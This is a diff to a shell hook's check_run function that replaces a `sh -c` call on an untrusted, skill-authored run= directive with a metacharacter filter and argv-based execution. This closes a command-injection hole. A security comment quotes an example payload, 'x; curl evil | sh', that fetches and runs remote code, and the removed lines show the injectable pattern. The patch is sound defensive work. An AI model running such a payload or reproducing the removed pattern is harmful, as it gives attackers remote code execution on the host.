@@ -456,17 +456,32 @@ check_run() {
             fi
             # Resolve a checker frozen at the run root (e.g. run="checks/x.sh"),
             # then execute from the stage dir.
-            cr_first=${cr_runcmd%% *}
-            cr_rest=""
-            case "$cr_runcmd" in
-                *' '*) cr_rest=" ${cr_runcmd#* }" ;;
+            #
+            # SECURITY: cr_runcmd is a skill-authored run="..." gate directive
+            # (untrusted, and this hook fires on every tool call). Never assemble
+            # it into a shell string - the old `sh -c "$cr_exec"` let a malicious
+            # skill inject run="x; curl evil | sh" for host RCE. Reject shell
+            # metacharacters, then word-split + exec via argv inside the subshell
+            # so any residual metacharacter is a literal argument (never an
+            # operator) and the positional-param clobber cannot leak out.
+            case $cr_runcmd in
+                *';'*|*'|'*|*'&'*|*'$'*|*'`'*|*'<'*|*'>'*|*'('*|*')'*|*'{'*|*'}'*)
+                    echo "DENY $cr_ws $cr_ts $cr_stage: gate run=\"$cr_runcmd\" has shell metacharacters (refused)"
+                    continue ;;
             esac
             cr_root_abs=$(cd "$cr_run" && pwd -P)
-            cr_exec=$cr_runcmd
-            if [ -f "$cr_root_abs/$cr_first" ]; then
-                cr_exec="'$cr_root_abs/$cr_first'$cr_rest"
-            fi
-            if cr_out=$( (cd "$cr_stage_dir" && sh -c "$cr_exec") 2>&1 ); then
+            if cr_out=$(
+                {
+                    set -f
+                    # shellcheck disable=SC2086  # deliberate split of a metachar-free directive
+                    set -- $cr_runcmd
+                    [ "$#" -ge 1 ] || exit 0
+                    if [ -f "$cr_root_abs/$1" ]; then
+                        cr_c=$cr_root_abs/$1; shift; set -- "$cr_c" "$@"
+                    fi
+                    cd "$cr_stage_dir" && exec "$@"
+                } 2>&1
+            ); then
                 :
             else
                 echo "DENY $cr_ws $cr_ts $cr_stage: checker failed: $cr_runcmd"
